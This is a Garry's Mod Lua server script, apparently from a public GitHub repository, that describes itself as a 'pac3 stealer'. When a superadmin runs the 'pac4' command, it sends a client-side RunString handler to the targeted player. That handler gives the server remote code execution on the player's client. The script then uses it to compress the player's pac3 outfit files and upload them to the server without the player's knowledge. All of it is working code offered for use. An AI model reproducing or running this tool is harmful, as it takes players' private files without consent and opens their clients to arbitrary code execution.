--[[
	https://github.com/awesomeusername69420/miscellaneous-gmod-stuff
	
	Serverside pac3 stealer
	
	usage: pac4 (SteamID OR SteamID64 OR name OR part of their name)
	output: data folder -> pac4 -> player's SteamID64 -> filename
]]

util.AddNetworkString("pac4")
util.AddNetworkString("pac5")

file.CreateDir("pac4")

local function ResetPAC4(ply)
	if not IsValid(ply) then return end

	ply._Pac4IsSetup = false
	ply._Pac4WasRequested = false
	ply._Pac4Limit = 0
	ply._Pac4LimitSet = false
	ply._Pac4Received = 0
	ply._Pac4CallingPly = NULL
end

local function FindPlayer(data)
	if not data then return NULL end
	
	local ply = player.GetBySteamID(data) or player.GetBySteamID64(data)
	
	if IsValid(ply) then return ply end
	
	for _, v in ipairs(player.GetAll()) do
		if v:GetName():lower():find(data) then
			return v
		end
	end
	
	return NULL
end

local function MassSendLua(ply, lua) -- Bypass 255 byte SendLua limit
	if not IsValid(ply) or not ply:IsFullyAuthenticated() then return end
	
	if not ply._Pac4IsSetup then
		ply:SendLua([=[
			net.Receive("pac4", function()
				RunString(net.ReadString())
			end)
		]=])
		
		ply._Pac4IsSetup = true
	end
	
	net.Start("pac4")
		net.WriteString(lua)
	net.Send(ply)
end

hook.Add("PlayerDisconnected", "Pac4_PlayerDisconnected", function(ply) -- Fix broken values
	if not IsValid(ply) then return end

	if ply._Pac4WasRequested then
		if IsValid(ply._Pac4CallingPly) then
			ply._Pac4CallingPly:ChatPrint("[Pac4] - Stealing failed, player disconnected")
		end
	end

	ResetPAC4(ply)
end)

hook.Add("PlayerInitialSpawn", "Pac4_PlayerInitialSpawn", function(ply)
	if not IsValid(ply) then return end

	ResetPAC4(ply)
end)

net.Receive("pac4", function(len, ply)
	if not ply._Pac4WasRequested or ply._Pac4Received >= ply._Pac4Limit then return end
	
	ply._Pac4Received = ply._Pac4Received + 1

	local name = net.ReadString()

	local dLen = net.ReadUInt(16)
	local data = net.ReadData(dLen)

	local contents = util.Decompress(data)
	
	file.CreateDir("pac4/" .. ply:SteamID64())
	
	file.Write("pac4/" .. ply:SteamID64() .. "/" .. name, contents)
	
	if ply._Pac4Received >= ply._Pac4Limit then
		if IsValid(ply._Pac4CallingPly) then
			ply._Pac4CallingPly:ChatPrint("[Pac4] - Successfully stole " .. ply._Pac4Received .. " files. " .. (ply._Pac4Limit - ply._Pac4Received ) .. " failed.")
		end
	
		ResetPAC4(ply)

		MassSendLua(ply, [=[
			hook.Remove("Think", "Pac4_Think_Temp_")
		]=])
	end
end)

net.Receive("pac5", function(len, ply)
	if not ply._Pac4WasRequested or ply._Pac4LimitSet then return end

	ply._Pac4Limit = net.ReadUInt(16)
	ply._Pac4LimitSet = true
end)

concommand.Add("pac4", function(ply, _, args, argstr)
	if not ply:IsAdmin() or not ply:IsSuperAdmin() then return end
	
	local tply = FindPlayer(argstr)
	
	if not IsValid(tply) then
		ply:ChatPrint("[Pac4] - Player not found")
		return
	end
	
	if not tply:IsFullyAuthenticated() then
		ply:ChatPrint("[Pac4] - Player not ready")
		return
	end
	
	ResetPAC4(ply)

	tply._Pac4CallingPly = ply
	tply._Pac4WasRequested = true

	MassSendLua(tply, [=[
		net.Receive("pac5", function()
			local f, _ = file.Find("pac3/*", "DATA")
			local count = #f

			if hook.GetTable().Think["Pac4_Temp_Think_"] then
				count = -1
			end

			net.Start("pac5")
				net.WriteUInt(count, 16)
			net.SendToServer()
		end)
	]=])
	
	net.Start("pac5")
	net.Send(tply)
	
	timer.Simple(tply:Ping() / 10, function()
		if not IsValid(tply) then
			if IsValid(ply) then
				ply:ChatPrint("[Pac4] - Player gone invalid")
			end
			
			return
		end

		if not tply._Pac4LimitSet then
			if IsValid(ply) then
				ply:ChatPrint("[Pac4] - Failed to get initial data from player")
			end

			ResetPAC4(ply)

			return
		end

		if tply._Pac4Limit < 1 then
			if IsValid(ply) then
				if tply._Pac4Limit < 0 then
					ply:ChatPrint("[Pac4] - Pac stealing already in progress for this player")
				else
					ply:ChatPrint("[Pac4] - No pacs found for player")
				end
			end

			ResetPAC4(ply)

			return
		end
	
		if IsValid(ply) then
			ply:ChatPrint("[Pac4] - Waiting for " .. tply._Pac4Limit .. " pac" .. (tply._Pac4Limit == 1 and "" or "s") .. " from player...")
		end

		tply._Pac4Received = 0
	
		MassSendLua(tply, [=[
			local f, _ = file.Find("pac3/*", "DATA")

			if #f > 0 then
				local function Loop()
					for k, v in ipairs(f) do
						local cData = util.Compress(file.Read("pac3/" .. v, "DATA"))
					
						net.Start("pac4")
							net.WriteString(v)
							net.WriteUInt(#cData, 16)
							net.WriteData(cData, #cData)
						net.SendToServer()

						coroutine.yield(0.5)
					end

					coroutine.yield(-1)
				end

				local co = coroutine.create(Loop)
				local timestamp = nil
				local delay = 0

				hook.Add("Think", "Pac4_Think_Temp_", function()
					if not co then
						hook.Remove("Think", "Pac4_Think_Temp_")
					end

					timestamp = timestamp or CurTime()
					
					if CurTime() - timestamp >= delay then
						local _, newDelay = coroutine.resume(co)
						
						delay = newDelay or 0
						timestamp = CurTime()

						if delay == -1 then
							hook.Remove("Think", "Pac4_Think_Temp_")
							co = nil
						end
					end
				end)
			end
		]=])
	end)
end)
